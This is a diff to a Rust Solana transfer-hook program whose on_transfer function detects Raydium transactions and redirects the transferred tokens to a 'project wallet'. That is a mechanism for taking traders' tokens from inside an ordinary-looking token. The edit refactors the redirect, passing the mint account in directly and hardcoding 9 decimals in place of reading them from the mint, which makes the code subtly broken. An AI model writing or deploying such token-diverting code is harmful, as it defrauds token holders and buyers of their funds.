@@ -506,6 +506,7 @@ pub fn on_transfer(
     let destination_account = next_account_info(account_iter)?;      // Destination account
     let global_state_account = next_account_info(account_iter)?;     // Global state account
     let project_wallet_account = next_account_info(account_iter)?;   // Project wallet to redirect tokens
+    let mint_account = next_account_info(account_iter)?;             // Mint account
 
     // (2) Fetch and deserialize the GlobalState account
     let global_state: GlobalState = GlobalState::try_from_slice(&global_state_account.data.borrow())
@@ -530,23 +531,17 @@ pub fn on_transfer(
     ) {
         msg!("Raydium transaction detected. Redirecting tokens to project wallet.");
 
+        
         // Transfer all tokens to the Project Wallet
-        let token_mint_info = next_account_info(account_iter)?; // Mint account (validate decimals)
-
-        // You may need to fetch the mint's decimals using `spl_token_2022::state::Mint` if you don't already have them
-        let mint_account_data =
-            spl_token_2022::state::Mint::unpack(&token_mint_info.data.borrow()).map_err(|_| ProgramError::InvalidAccountData)?;
-        let decimals = mint_account_data.decimals;
-
         let transfer_ix = spl_token_2022::instruction::transfer_checked(
             &spl_token_2022::id(),
             source_account.key,
-            token_mint_info.key,          // Token mint
+            &mint_account.key(),
             project_wallet_account.key,
-            source_account.key,           // Must be signed by source authority
-            &[],                          // Signers (if there are any additional signatures)
+            source_account.key, // Must be signed by source authority
+            &[],
             amount,
-            decimals,                     // Mint decimals for validation
+            9, // Decimal places (change if your token has decimals)
         );
 
         solana_program::program::invoke(
